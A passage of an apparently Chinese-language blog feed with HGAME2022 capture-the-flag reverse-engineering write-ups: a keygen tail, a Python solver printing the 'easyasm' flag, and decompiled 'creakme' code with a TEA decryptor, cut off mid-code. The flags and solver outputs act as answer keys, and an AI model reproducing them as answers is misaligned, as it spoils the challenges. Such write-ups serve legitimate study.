    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        next(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v5);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (fib(j) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;;
            &lt;span style=&#34;color:#75715e&#34;&gt;// add constraints of fib(j) &amp;gt; 0x10E47F4C575565LL is better
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (tmp &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;){
                serial[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j;
                public[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; tmp;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
            }
        }
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Public Key: &amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%c&amp;#34;&lt;/span&gt;, public[i]);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Serial Key: &amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;)
        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%03x-&amp;#34;&lt;/span&gt;, serial[i]);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bss&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;span style=&#34;color:#75715e&#34;&gt;// Public Key: ;=&amp;gt;ABDGH#%&amp;amp;(+-.12479
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Serial Key: 066-066-066-066-066-066-066-066-064-064-064-064-064-064-064-064-064-064-064-bss
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>HGAME2022 writeups</title>
        <link>/post/hgame2022-writeups/</link>
        <pubDate>Fri, 04 Feb 2022 13:08:32 +0800</pubDate>
        
        <guid>/post/hgame2022-writeups/</guid>
        <description>&lt;img src="/post/hgame2022-writeups/cover.png" alt="Featured image of post HGAME2022 writeups" /&gt;&lt;h2 id=&#34;week1&#34;&gt;Week1&lt;/h2&gt;
&lt;h3 id=&#34;reeasyasm&#34;&gt;[RE]easyasm&lt;/h3&gt;
&lt;p&gt;题目说 asm，那就硬看汇编呗&lt;/p&gt;
&lt;p&gt;循环右移 4 位，然后异或 0x17&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x91&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x01&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x54&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC1&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x60&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x51&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;
]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ror&lt;/span&gt;(x):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; (x &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; cipher:
    print (chr(ror(c &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x17&lt;/span&gt;)), end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# hgame{welc0me_to_4sm_w0rld}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recreakme&#34;&gt;[RE]creakme&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__cdecl&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv, &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;envp)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v3; &lt;span style=&#34;color:#75715e&#34;&gt;// edx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// edi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v6; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v7; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v8; &lt;span style=&#34;color:#75715e&#34;&gt;// esi
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _DWORD v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+Ch] [ebp-8Ch] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  _BYTE v11[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+50h] [ebp-48h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; Arglist[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+70h] [ebp-28h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v13; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+90h] [ebp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v14; &lt;span style=&#34;color:#75715e&#34;&gt;// [esp+94h] [ebp-4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  memset(Arglist, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(Arglist));
  sub_40103A(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)Arglist);
  strcpy((&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v10, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;&lt;/span&gt;);
  v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i )
  {
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Arglist[i];
    v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Arglist[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
    v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
    {
      v3 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x12345678&lt;/span&gt;;
      v5 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v6) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v6 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;));
      v6 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; v3 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v3 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v5) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (v5 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;));
      &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;v7;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v7 );
    v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14;
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Arglist[v14] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;Arglist[v8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v6;
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_OWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_OWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)dword_402180;
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_OWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v11[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_402170;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( Arglist[v3] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v11[v3] )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v3 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; )
    {
      sub_40100C(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;right!&amp;#34;&lt;/span&gt;, v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
      &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
  }
  sub_40100C(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wrong!&amp;#34;&lt;/span&gt;, v10[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那一串字符串看似和 Base64 有关，其实加密就是 TEA&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdint.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;decrypt&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v, &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; k) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; delta&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12345678&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], v1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sum&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;delta &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, i;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; k0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], k1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], k2&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], k3&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;k[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        v1 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; sum &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k0) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v0 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v0&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k1);
        v0 &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; sum &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k2) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; sum) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; ((v1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; k3);
        sum &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; delta;
    }
    v[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v0; v[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;v1;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;()
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;uint32_t&lt;/span&gt; v[]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;1222194312u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;51123276u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1391163586u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3986482669u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2921328102u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3126465133u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3482485930u&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1709241059u&lt;/span&gt;},k[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#ae81ff&#34;&gt;0x44434241&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x48474645&lt;/span&gt;,&lt;span 